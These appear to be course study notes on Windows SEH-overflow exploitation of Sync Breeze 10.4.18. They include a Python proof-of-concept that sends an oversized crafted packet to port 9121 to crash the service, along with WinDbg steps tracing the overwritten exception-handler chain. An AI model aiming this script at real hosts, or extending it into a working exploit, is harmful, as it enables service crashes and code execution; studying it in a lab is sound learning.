#### Structured Exception Handling (SEH)

As opposed to classic buffer overflows, there are avenues to exploit other structures and pointer to get code execution.

An example being the Windows exception-handling structure, which can be demonstrated in 10.4.18 of Sync Breeze

1. Crash the Application 
2. Control EIP 
3. Make Space for Shellcode 
4. Check Bad Characters 
5. Find a Return Instruction 
6. Jump to ESP 
7. Generate Shellcode

## Crash the Application
Provided POC script: crafts a custom protocol header with a large buffer
```
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * size

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")

```
- Attach Windbg on Sync Breeze in the VM and run the script
- The process crashes and we see an access violation, EAX has been overwritten as `eax=41414141`. The program tries to deference a pointer value from the EAX register and crashes

## Analyzing the Crash
- The program tries to reach a location at offset 0x24 from the EAX, which is out of program memory, `call dword ptr [eax+24h]`
- EIP is still not overflowed, but if we print the values on the stack with `dds esp L30`, we see that some values did make it, just not quite to EIP.
- press g, and we get a new crash, which show EIP has been overflowed
- The first error handler was a 'first chance exception' which is a notification that an unexpected event occurred during execution

## Intro to SEH
**Hardware exceptions** are initiated by the CPU. We encountered a typical hardware exception when our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address.

**Software exceptions** are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. For example, a software developer raises an exception (try/except) in their code to signal a function could not execute normally because of an invalid input argument.

> A software exception raised in code will leverage the SEH (Structure Exception Handling) mechanism in Windows OS. Every time a try block is encountered in the execution of the thread, a pointer to the corresponding exception handler is stored on the stack and stores in a linked list. The last node (last resort handler) is a default exception handler that will kill the thread

![[Pasted image 20230602154707.png]]
Structured exception handling works on a per-thread level, each thread is identified by the Thread Environment Block (TEB) which stores info related to each thread.

`dt nt!_TEB` starts with nested structure -> 
`dt _NT_TIB` contains a pointer (called `ExceptionList`) to -> 
`dt _EXCEPTION_REGISTRATION_RECORD` (ERR) which contains a pointer to the next ERR and to an `EXCEPTION_DISPOSITION` returned by ->
`_except_handler` with parameters `EstablisherFrame` (points back to the calling ERR) and `ContextRecord` (points to a structure containing register state at time of the exception)
`dt ntdll!_CONTEXT` dumps -> register information

> The information in `ContextRecord` is important as it will be used to restore execution state after the exception has been handled

`dt _EXCEPTION_DISPOSITION` -> return results from exception handling, `ExceptionContinueExecution` = exception can be handled here, `ExceptionContinueSearch` = exception couldn't be handled

``
## SEH Validation

`_ntdll!KiUserExceptionDispatcher` (called on exception) CALLS -> `RtlDispatchException` (previous process) AND `_RtlIsValidHandler` (additional validity checks`)
`_RtlIsValidHandler` CALLS (on successful validation) ->`_RtlpExecuteHandlerForException` CALLS ->  `ExecuteHandler`

- `_ntdll!KiUserExceptionDispatcher` - responsible for dispatching exceptions on Windows operating systems. It eventually calls `_RtlDispatchException` which retrieves the TEB and does the previous process.
	For each Handler member, the OS will check to see if the `_EXCEPTION_REGISTRATION_RECORD` used is within the stack memory limits of the TEB
- `_RtlIsValidHandler` includes SafeSEH and SEHOP (default only on Windows server) 
- `_RtlpExecuteHandlerForException` sets up the appropriate arguments and invokes `ExecuteHandler`. As the name suggests, this native API is responsible for calling the `except_handler `functions registered on the stack.

### Protections
- SafeSEH - modules compiled with it produce an image containing a table of safe exception handlers (to prevent injected handlers)
- Structured Exception Handler Overwrite Protection (SEHOP) - validates the `_EXCEPTION_REGISTRATION_RECORD` list chain before invoking them
- GS - the EBP is XOR'd with a cookie before execution and saved in .data, then checked again before returning. However, this can be bypassed by overwriting a EXCEPTION_REGISTRATION_RECORD since the function will never reach its return.


psuedo-code implementation of  `_RtlIsValidHandler` : 
```
BOOL RtlIsValidHandler(Handler) // NT 6.3.9600
  {
        if (/* Handler within the image */) {
            if (DllCharacteristics->IMAGE_DLLCHARACTERISTICS_NO_SEH)
                goto InvalidHandler;
            if (/* The image is .Net assembly, 'ILonly' flag is enabled */)
                goto InvalidHandler;
            if (/* Found 'SafeSEH' table */) {
                if (/* The image is registered in 'LdrpInvertedFunctionTable' (or its cache), or the initialization of the process is not complete */) {
                    if (/* Handler found in 'SafeSEH' table */)
                        return TRUE;
                    else
                        goto InvalidHandler;
                }
            return TRUE;
        } else {
            if (/* 'ExecuteDispatchEnable' and 'ImageDispatchEnable' flags are enabled in 'ExecuteOptions' of the process */)
                return TRUE;
            if (/* Handler is in non-executable area of the memory */) {
                if (ExecuteDispatchEnable) return TRUE;
            }
            else if (ImageDispatchEnable) return TRUE;
        }
        InvalidHandler:
            RtlInvalidHandlerDetected(...);
            return FALSE;
  }
```




# Sync Breeze SEH Overflow Example
The intent is to overflow the stack buffer into overwriting a valid registered exception handler. Then, we can get control of the instruction pointer after triggering an exception. 

## Inspect Intact Chain
- `!teb` : shows memory address of current threads' TEB and sub-structures, including ExceptionList
- `dt _EXCEPTION_REGISTRATION_RECORD 01d8ff70` : dumps structure data at memory address (listed by previous command)
	- do this 3 times, using the `Next` value to find next Record, finally getting to the terminating Exception which has a Next of `0xffffffff`

## Inspect Exploit's Chain
- Run Sync Breeze with `g`, and run exploit
- Perform the same steps as last stage
	- We find that the second Record has been overwritten by the exploit (and thus its Next value is unusable) causing another access violation when ran.
	- `!exchain` : display exception handlers of the current thread, by default it shows the SEH mechanism handlers. Does what we did above, but condensed.
		```
		0:011> !exchain
		01c4fe1c: libpal!md5_starts+149fb (00b3df5b)
		01c4ff54: 41414141
		Invalid exception stack at 41414141
		```
>Records are pushed on stack from first to last, so generally the last Record structure will be overwritten first.
- `k` : to dump callstack, showing that `ntdll!ExecuteHandler2`, which calls `_except_handler` was called just before our EIP overflow
- `r` : to display registers, and `dds REGISTER L10` to dump each register, checking to see if we can access our buffer space with a register. We cannot :(
- restart SyncBreeze and `bp ntdll!ExecuteHandler2`, then run program until breakpoint reached. `g` : to continue, since this is only the first call (from the non-overwritten Record), then we reach the breakpoint again for the overwritten Record. 
- `u eip L10` : to unassemble memory at EIP:
	```
	0:008> u @eip L11
	ntdll!ExecuteHandler2:
	770a3adc 55              push    ebp
	770a3add 8bec            mov     ebp,esp
	770a3adf ff750c          push    dword ptr [ebp+0Ch]
	770a3ae2 52              push    edx
	770a3ae3 64ff3500000000  push    dword ptr fs:[0]
	770a3aea 64892500000000  mov     dword ptr fs:[0],esp
	770a3af1 ff7514          push    dword ptr [ebp+14h]
	770a3af4 ff7510          push    dword ptr [ebp+10h]
	770a3af7 ff750c          push    dword ptr [ebp+0Ch]
	770a3afa ff7508          push    dword ptr [ebp+8]
	770a3afd 8b4d18          mov     ecx,dword ptr [ebp+18h]
	770a3b00 ffd1            call    ecx
	770a3b02 648b2500000000  mov     esp,dword ptr fs:[0]
	770a3b09 648f0500000000  pop     dword ptr fs:[0]
	770a3b10 8be5            mov     esp,ebp
	770a3b12 5d              pop     ebp
	770a3b13 c21400          ret     14h
	```
	- we see 4 pushes and a call to ECX, inferring a call to `_except_handler`
- `t` : to step into instruction and follow the execution of `ntdll!ExecuteHandler2`
	- First (770a3adc and 770a3add), EBP is put on the stack, and ESP value is moved to EBP (to easily access the arguments passed to`ntdll!ExecuteHandler2` )
	- First push instruction: `t` -> `!teb` -> `dt ...ERR ADDRESS` (same steps as above), we see that the value in Next is being pushed onto the stack
	- Second push instruction: `t` -> `u edx`, we see it places a position onto the stack that is offset 0x44 into `ntdll!ExecuteHandler2`
	- Third push instruction: `t` -> `!teb`, we see it places the pointer to ExceptionList (to a RECORD) onto the stack
	- Move instruction: this will overwrite the current ExceptionList with the value of ESP
- In summary, before the parameters for `_except_handler` are pushed, the OS updates ExceptionList with a new RECORD structure which will handle any new exceptions that might occur during `_except_handler` execution. The function to handle this is stored in EDX before `ntdll!ExecuteHandler2` is called.
- Step through with `t` until we get to `call ecx`, which is where our overflow (causing another exception) occurs.